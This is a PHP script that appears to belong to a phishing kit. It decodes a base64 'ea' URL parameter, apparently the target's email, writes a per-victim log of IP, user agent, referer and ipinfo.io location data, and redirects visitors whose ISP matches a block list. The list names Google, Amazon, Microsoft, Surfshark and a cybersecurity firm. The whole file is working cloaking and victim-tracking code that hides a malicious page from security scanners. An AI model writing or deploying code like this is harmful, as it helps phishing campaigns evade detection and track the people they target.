<?php
date_default_timezone_set('Asia/Seoul');

@session_start();
ob_clean();
flush();

$_ISP = "";
$_ID = "";

if (isset($_GET['ea']) && !empty($_GET['ea']))
{
    $_ID =base64_decode( $_GET['ea']);
}
$id = ($_ID!="" )?$_ID :"unknown"; 
$id_txt ="z_" . $id . ".log";
$_LOG_FILE = "";

Write_Info($_ID);
$_ISP = GetIsp();

function GetIsp()
{
    $_ISP="";
    $ipAddress = getenv("REMOTE_ADDR");

	$apiEndpoint = "http://ipinfo.io/{$ipAddress}/json";

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $apiEndpoint);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$response = curl_exec($ch);
	curl_close($ch);
	$data = json_decode($response, true);
	if (isset($data['org'])) {
		$_ISP = $data['org'];
	//	$log .= "ISP: {$_ISP}";
		
	} else {
	//	$log .= "ISP: 정보를 가져오는 데 실패했습니다.";
	}
	return $_ISP;
}
function Write_Info($_ID)
{
  
    if ($_ID == "") $_LOG_FILE = "Access.log";
    else $_LOG_FILE = "Z_{$_ID}.log";
    
    $_REQUEST_URI= $_SERVER["REQUEST_URI"]; // query string
    $_QUERY_STRING = $_SERVER["QUERY_STRING"]; 	
    
    $_USER_AGENT = $_SERVER["HTTP_USER_AGENT"];
    $_REMOTE_ADDR = $_SERVER["REMOTE_ADDR"];
    $_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
    $_REFERER = isset($_SERVER["HTTP_REFERER"])?$_SERVER["HTTP_REFERER"]:"";
    
    $dt  = date('d-m-y h:i:s');
    $log = "DATETIME: " .   $dt."\r\n";
    $log .="USER_AGENT: ".  $_USER_AGENT."\r\n";
    $log .="REMOTE_ADDR: ". $_REMOTE_ADDR. "\r\n";
    $log .="REFERER: ".     $_REFERER. "\r\n";
    $log .="REQUEST_URI: ". $_REQUEST_URI."\r\n";
    $log .="QUERY_STRING: ".$_QUERY_STRING ."\r\n";
    $log .="LANGUAGE: ".    $_lang."\r\n";
  
	$ipAddress = getenv("REMOTE_ADDR");

	$apiEndpoint = "http://ipinfo.io/{$ipAddress}/json";

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $apiEndpoint);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$response = curl_exec($ch);
	curl_close($ch);
	$data = json_decode($response, true);
	if (isset($data['org'])) {
		$_ISP = $data['org'];
		$log .= "ISP: {$_ISP}";
		
	} else {
		$log .= "ISP: 정보를 가져오는 데 실패했습니다.";
	}
	$log .= "\r\n";

	if (isset($data['country'])) {
		$country = $data['country'];
		$log .= "country: {$country} .";
	} else {
		$log .= "country: 정보를 가져오는 데 실패했습니다.";
	}
	$log .= "\r\n";
	//region
	if (isset($data['region'])) {
		$region = $data['region'];
		$log .= "Region: {$region}";
	} else {
		$log .= "region: 정보를 가져오는 데 실패했습니다.";
	}
	$log .= "\r\n\r\n";

	$fp = fopen($_LOG_FILE,"a+"); 
	fwrite($fp,$log);
	fclose($fp);
}



//header('Location: ./index.php');
/// 2023/ 12 / 05 Butterfly




//check isp 
if (check_block_isp($_ISP))
{
    header("Location:https://bit.ly/");
    die();
}
///block bad isp

$_Block_Isp_File_ = "block_isp.php";
function check_block_isp($_isp)
{
	$ret = false;
	$_Block_Isp_File_ = "./blockisp.php";
	$_REMOTE_ADDR = $_SERVER["REMOTE_ADDR"];

	if (!file_exists($_Block_Isp_File_))
	{
		file_put_contents($_Block_Isp_File_,"<?php header('HTTP/1.0 404 NOT FOUND'); exit();?>\r\nGoogle LLC\r\nGoogle Fiber LLC\r\nAmazon.com, Inc.\r\nSurfshark Ltd.\r\nMicrosoft Corporation\r\nConstantine Cybersecurity Ltd.\r\n");
		return $ret;
	}
	$handle = fopen($_Block_Isp_File_, "r");
	if ($handle) {
		while (($line = fgets($handle)) !== false)
		{//
		  //  echo "ISP:".$_isp."-".$line;
			if (strpos($_isp, trim($line) )!==false)
			{
			    echo "Find!!!";
				$ret = true;
				break;
			}
		}

		fclose($handle);
	}
	return $ret;
}

?>
